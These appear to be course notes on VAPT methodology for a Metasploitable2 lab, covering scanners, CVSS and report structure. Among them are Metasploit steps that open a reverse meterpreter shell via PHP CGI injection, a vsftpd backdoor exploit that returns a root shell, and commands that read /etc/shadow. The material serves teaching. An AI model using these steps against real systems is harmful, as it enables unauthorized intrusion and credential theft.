# 📖 Week 1 — Theoretical Knowledge Notes

---

## 1. VAPT Methodology — PTES Framework

### 1.1 What is VAPT?

Vulnerability Assessment and Penetration Testing (VAPT) is a structured security evaluation process that identifies, validates, and documents security weaknesses in a target system. It combines two disciplines:

- **Vulnerability Assessment (VA):** Systematic discovery and enumeration of vulnerabilities using automated tools (Nmap, OpenVAS, Nikto).
- **Penetration Testing (PT):** Manual and automated exploitation of discovered vulnerabilities to confirm real-world attack feasibility.

### 1.2 PTES Phases

The Penetration Testing Execution Standard (PTES) defines a structured methodology:

```
Phase 1: Pre-Engagement
         ↓ Define scope, targets, rules of engagement
Phase 2: Intelligence Gathering (Reconnaissance)
         ↓ OSINT, service enumeration, fingerprinting
Phase 3: Threat Modelling
         ↓ Identify attack vectors, prioritise targets
Phase 4: Vulnerability Identification
         ↓ Automated scanning (Nmap, OpenVAS, Nikto, ZAP)
Phase 5: Exploitation
         ↓ Validate vulnerability exploitability (Metasploit)
Phase 6: Post-Exploitation
         ↓ Privilege escalation, lateral movement, evidence collection
Phase 7: Reporting
         ↓ Findings, risk ratings, remediation recommendations
```

---

## 2. Vulnerability Scanning Tools

### 2.1 Nmap — Network Mapper

Nmap is the industry-standard open-source network scanner. It identifies open ports, running services, operating system versions, and detects known vulnerabilities via NSE scripts.

**Key Scan Types:**

| Flag | Scan Type | Description |
|------|-----------|-------------|
| `-sS` | SYN Stealth Scan | Half-open TCP scan — less detectable |
| `-sV` | Version Detection | Identify service versions on open ports |
| `-sC` | Default Scripts | Run NSE default scripts |
| `-A` | Aggressive Scan | OS detection + version + scripts + traceroute |
| `-O` | OS Detection | Fingerprint the target OS |
| `-p-` | All Ports | Scan all 65535 ports |
| `-T4` | Timing Template | Faster scan (T0=paranoid → T5=insane) |

**Common Commands:**
```bash
# Service version detection
nmap -sV -A <TARGET_IP>

# Full port scan
nmap -p- -T4 <TARGET_IP>

# Save output to file
nmap -A -sV -sC -O 192.168.56.104 -oN nmap_results.txt
```

---

### 2.2 OpenVAS (Greenbone Vulnerability Manager)

OpenVAS is a full-featured vulnerability scanner that tests targets against thousands of known CVEs and misconfigurations. It generates CVSS-scored reports with remediation guidance.

**Architecture:**
```
Host Browser → OpenVAS Web UI (Greenbone Security Assistant)
                      ↓
               OpenVAS Scanning VM
                      ↓
               Target Machine (Metasploitable2)
```

**Why a Dedicated OpenVAS VM?**
Running OpenVAS inside Kali Linux on limited hardware causes:
- High RAM consumption (4–8 GB minimum required)
- CPU throttling during scan execution
- Feed synchronization failures
- Service crashes

**Solution:** Deploy OpenVAS on a dedicated VM. This reflects real-world enterprise practice where scanning infrastructure is separated from analyst workstations.

**CVSS Severity Ranges:**

| Score | Severity |
|-------|----------|
| 9.0–10.0 | Critical |
| 7.0–8.9 | High |
| 4.0–6.9 | Medium |
| 0.1–3.9 | Low |

---

### 2.3 Nikto — Web Server Scanner

Nikto is an open-source web server scanner that checks for:
- Outdated server software (Apache, PHP, IIS)
- Missing security headers (CSP, HSTS, X-Frame-Options)
- Dangerous HTTP methods (TRACE, PUT)
- Exposed sensitive files and directories
- Known CVE-linked vulnerabilities

```bash
# Basic web scan
nikto -h http://<TARGET_IP>

# Save output
nikto -h http://192.168.56.104 -output logs/nikto_scan.txt
```

---

### 2.4 OWASP ZAP — Web Application Scanner

OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner. It acts as a proxy between browser and target, actively finding vulnerabilities.

**Key Features:**
- Spider scan — crawls all pages/links automatically
- Active scan — injects test payloads (SQL, XSS, path traversal)
- Passive scan — observes traffic without sending attack payloads
- API scanning — tests REST and SOAP endpoints

**Common Vulnerability Classes Found:**
- Cross-Site Scripting (XSS)
- SQL Injection
- Path Traversal
- Remote Code Execution
- Command Injection

---

## 3. Exploitation Framework — Metasploit

### 3.1 What is Metasploit?

Metasploit is the world's most widely used penetration testing framework. It contains hundreds of pre-built exploit modules, payloads, and post-exploitation tools.

**Core Components:**

| Component | Purpose |
|-----------|---------|
| `msfconsole` | Primary command-line interface |
| Exploit | Module that takes advantage of a vulnerability |
| Payload | Code that runs on the target after exploitation |
| Meterpreter | Advanced post-exploitation shell |
| Auxiliary | Non-exploit modules (scanners, brute-forcers) |

### 3.2 PHP CGI Vulnerability (CVE-2012-1823)

PHP CGI argument injection allows an attacker to pass command-line arguments to the PHP binary when accessed via a CGI-configured web server. This bypasses argument filtering and can lead to full remote code execution.

**CVSS Score:** 9.8 (Critical)

**Why Critical:**
- Attack Vector: Network (exploitable remotely)
- Privileges Required: None (no authentication)
- User Interaction: None
- Impact: Full system compromise (C:H / I:H / A:H)

```bash
# Metasploit Exploitation Steps
msfconsole
msf6 > search php cgi
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 > set RHOST <Target-IP>
msf6 > set RPORT 80
msf6 > set targeturi /mutillidae/
msf6 > set payload php/meterpreter/reverse_tcp
msf6 > set LHOST <Attacker-IP>
msf6 > set LPORT 4444
msf6 > run
```

---

## 4. Risk Assessment — CVSSv3

### 4.1 CVSS v3.1 Scoring Metrics

CVSS (Common Vulnerability Scoring System) v3.1 uses the following Base Score metrics:

| Metric | Options |
|--------|---------|
| **Attack Vector (AV)** | Network (N) / Adjacent (A) / Local (L) / Physical (P) |
| **Attack Complexity (AC)** | Low (L) / High (H) |
| **Privileges Required (PR)** | None (N) / Low (L) / High (H) |
| **User Interaction (UI)** | None (N) / Required (R) |
| **Scope (S)** | Unchanged (U) / Changed (C) |
| **Confidentiality (C)** | None (N) / Low (L) / High (H) |
| **Integrity (I)** | None (N) / Low (L) / High (H) |
| **Availability (A)** | None (N) / Low (L) / High (H) |

### 4.2 Risk Matrix

```
         │ LOW Impact │ MED Impact │ HIGH Impact │
─────────┼────────────┼────────────┼─────────────┤
HIGH Prob│   Medium   │    High    │  Critical   │
MED Prob │    Low     │   Medium   │    High     │
LOW Prob │    Low     │    Low     │   Medium    │
```

---

## 5. Key Vulnerabilities — Week 1 Targets

### 5.1 vsftpd 2.3.4 Backdoor (CVE-2011-2523)

vsftpd 2.3.4 contained a deliberately introduced backdoor — when a username ending in `:)` was sent to the FTP server, it opened a root shell on port 6200. This is one of the most well-known intentional backdoors in open-source history.

```bash
# Exploit via Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
run
# Returns: root shell
```

### 5.2 DistCC Remote Code Execution (CVE-2004-2687)

DistCC (distributed compiler daemon) running on port 3632 allows unauthenticated remote command execution. The daemon accepts and compiles code without authentication, enabling attackers to execute arbitrary commands.

### 5.3 rlogin/rexec Services

Legacy r-services (rlogin on 513, rexec on 512, rsh on 514) provide remote access without any encryption or strong authentication. Metasploitable2 exposes these services, allowing unauthenticated remote access from trusted hosts.

### 5.4 OWASP Web Application Top 10 (Relevant to Week 1)

| Rank | Vulnerability | Found In |
|------|---------------|---------|
| A01 | Broken Access Control | Mutillidae, DVWA |
| A03 | Injection (SQL, Command) | DVWA SQLi, Mutillidae |
| A07 | Cross-Site Scripting | DVWA XSS, ZAP findings |
| A05 | Security Misconfiguration | Apache 2.2.8, PHP 5.2.4 |
| A09 | Vulnerable Components | vsftpd 2.3.4, PHP CGI |

---

## 6. Reporting Standards

### 6.1 Professional VAPT Report Structure (PTES)

A professional PTES-compliant report includes:

1. **Executive Summary** — High-level overview for management/non-technical stakeholders
2. **Scope & Objectives** — What was tested and why
3. **Methodology** — Tools and phases used
4. **Lab Architecture** — Environment setup and network diagram
5. **Findings** — Vulnerability details with CVE, CVSS, evidence
6. **Risk Assessment** — Risk matrix and prioritisation
7. **Exploitation Evidence** — Screenshots and proof-of-concept
8. **Remediation Recommendations** — Specific fixes per vulnerability
9. **Conclusion** — Overall security posture assessment

### 6.2 Evidence Handling

Best practices for evidence in penetration testing:

```bash
# Hash all captured evidence for chain of custody
sha256sum /etc/passwd > evidence_hashes.txt
sha256sum /etc/shadow >> evidence_hashes.txt

# Document timestamps
date > timestamp.txt && cat /etc/passwd >> timestamp.txt
```

---
